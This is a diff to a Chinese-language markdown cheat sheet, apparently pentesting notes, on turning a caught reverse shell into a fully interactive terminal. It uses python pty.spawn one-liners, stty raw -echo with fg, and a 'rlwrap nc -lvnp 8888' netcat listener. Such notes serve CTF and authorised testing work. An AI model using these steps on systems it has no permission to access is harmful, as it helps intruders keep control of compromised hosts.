@@ -5,14 +5,30 @@ tags:
 ---
 ## 有python
 
-```bash
-$ python -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl-Z
-$ stty raw -echo
-$ fg
-$ reset
-$ export SHELL=bash
-//$ export TERM=xterm-256color
+## Python
+
+提升为完全交互式终端
+
+```python
+#检测python版本
+which python python2 python3
+
+# 提升为半交互式终端
+python -c 'import pty;pty.spawn("/bin/bash")' && export SHELL=bash && export TERM=xterm-256color
+
+# python3/python2
+python3 -c 'import pty;pty.spawn("/bin/bash")' && export SHELL=bash && export TERM=xterm-256color
+
+python2 -c 'import pty;pty.spawn("/bin/bash")' && export SHELL=sh && export TERM=xterm-256color
+ ​  
+# 将shell发送到后台  
+Ctrl+Z
+
+# 设置 shell 以通过反向 shell 发送控制字符和其他原始输入, 最终为完全交互式. 
+stty raw -echo;fg
+ ​  
+# 上面两步可以直接用下方监听代替(解决键盘输入，如上下左右等)
+rlwrap nc -lvnp 8888
 ```
 
 ## 无python(Socat)
